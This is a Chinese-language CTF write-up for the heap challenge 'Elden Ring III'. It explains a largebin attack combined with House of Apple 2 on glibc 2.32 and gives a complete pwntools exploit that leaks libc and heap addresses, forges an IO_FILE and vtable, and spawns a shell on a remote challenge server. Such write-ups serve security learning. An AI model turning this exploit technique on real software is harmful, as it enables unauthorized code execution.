# Elden Ring III

*write some large notes*

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x64   |
|RELRO |Full  |
|Canary|on    |
|NX    |on    |
|PIE   |on    |
|strip |no    |

## 解题思路

glibc 2.32  
反编译发现只能分配large bin，那就干脆学一下Largebin attack和House of Apple吧，
以后打高版本libc都要用到

我会在参考文献一栏列出优质的博客，没有它们，我不能做出这题！还有就是在打Apple的时候，
要想进入overflow分支，还需要伪造的IO_FILE里`_IO_write_ptr > _IO_write_base`

另，自glibc 2.38开始，调用链发生变化，`_IO_flsuh_all_lockp`已更名为`_IO_flsuh_all`，
但是apple2仍然能打，不影响

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

def payload(lo:int):
    global sh
    if lo:
        sh = process('./eldering3')
        if lo & 2:
            gdb.attach(sh, gdbscript='b show_note')
    else:
        sh = remote('139.196.183.57', 30273)
    libc = ELF('eldering3s/libc.so.6')
    elf = ELF('eldering')

    def addn(idx:int, size:int):
        sh.sendlineafter(b'>', b'1')
        sh.sendlineafter(b'Index', str(idx).encode())
        sh.sendlineafter(b'Size', str(size).encode())

    def deln(idx:int):
        sh.sendlineafter(b'>', b'2')
        sh.sendlineafter(b'Index', str(idx).encode())

    def edit(idx:int, content:bytes):
        sh.sendlineafter(b'>', b'3')
        sh.sendlineafter(b'Index', str(idx).encode())
        sh.sendafter(b'Content', content)

    def show(idx:int) -> bytes:
        sh.sendlineafter(b'>', b'4')
        sh.sendlineafter(b'Index: ', str(idx).encode())
        return sh.recv(7)

    def withdraw(): # quit and exit is Python builtin functions
        sh.sendlineafter(b'>', b'5')

    # leak libc and heap
    addn(0, 0x600)
    addn(1, 0x600) # guard chunk (prevent consolidating)
    addn(2, 0x600)
    addn(3, 0x600) # guard chunk
    deln(0)        # fd is around libc in Unsorted bin
    edit(0, b'\n') # 1st char is 0, so we had to make the address leak-able
    ret = show(0)
    ret = b'\0' + ret[1:6]
    edit(0, b'\0') # restore original value
    deln(2)        # fd of chunk 2 is chunk 0
    heap = show(2)
    deln(3)
    deln(1)        # restore empty heap

    dumpArena = libc.symbols['__malloc_hook'] + (libc.symbols['__malloc_hook'] - libc.symbols['__realloc_hook']) * 2
    mainArena = u64(ret[:6] + b'\0\0') - 0x60 # sub unsorted bin offset
    libcBase = mainArena - dumpArena
    success(f'\x1b[33mleak libcBase: {hex(libcBase)}\x1b[0m')
    ioListAll = libcBase + libc.symbols['_IO_list_all']
    wfileJumps = libcBase + libc.symbols['_IO_wfile_jumps']

    heapBase = u64(heap[:6] + b'\0\0') - 0x290
    success(f'\x1b[33mleak heapBase: {hex(heapBase)}\x1b[0m')

    # large bin attack
    fd = bk = libcBase + dumpArena + 0x4d0
    fdNext = heapBase + 0x290 # original values
    bkNext = ioListAll - 0x20 # write chunk 1 addr on _IO_list_all
    addn(0, 0x620)
    addn(15, 0x508)           # guard chunk
    addn(1, 0x610)
    addn(14, 0x508)           # guard chunk
    deln(0)                   # now in unsorted bin
    addn(2, 0x630)            # put chunk 0 in large bin
    deln(1)                   # now in unsorted bin
    edit(0, p64(fd) + p64(bk) + p64(fdNext) + p64(bkNext))
    addn(13, 0x630)           # put chunk 1 in large bin, trigger arbitrary write

    # house of apple 2
    forceChunk = heapBase + 0xdd0 # & chunk 1.prev_size
    fakeFile = FileStructure()    # _flags = 0, _IO_read_ptr = 0x621
    fakeFile.vtable = wfileJumps
    fakeFile._IO_write_ptr = 1
    fakeFile._wide_data = forceChunk + 0xe0
    # fakeFile._lock = lock
    fakeWideData = b'\0'*0xe0 + p64(forceChunk + 0xe0 + 0xe8) # 0xe0 bytes of 0 and _wide_vtable
    oneGadget = libcBase + 0xdf54f
    fakeWfileJumpTable = b'\0'*0x68 + p64(oneGadget)          # 0x68 bytes of 0 and __do_allocate
    # note that _flags and _IO_read_ptr is filled by chunk structure,
    # so we need to exclude them to keep the correct alignment
    edit(1, bytes(fakeFile)[16:] + fakeWideData + fakeWfileJumpTable)

    withdraw()
    sh.clean()
    sh.interactive()
```

## 参考文献

1. [Largebin Attack典例](https://www.anquanke.com/post/id/244018)
2. [House of Apple 2官方示例](https://bbs.kanxue.com/thread-273832.htm)
3. [House of Apple 2实操&调用链](https://ywhkkx.github.io/2022/11/10/House%20Of%20Apple-2.34-64/)
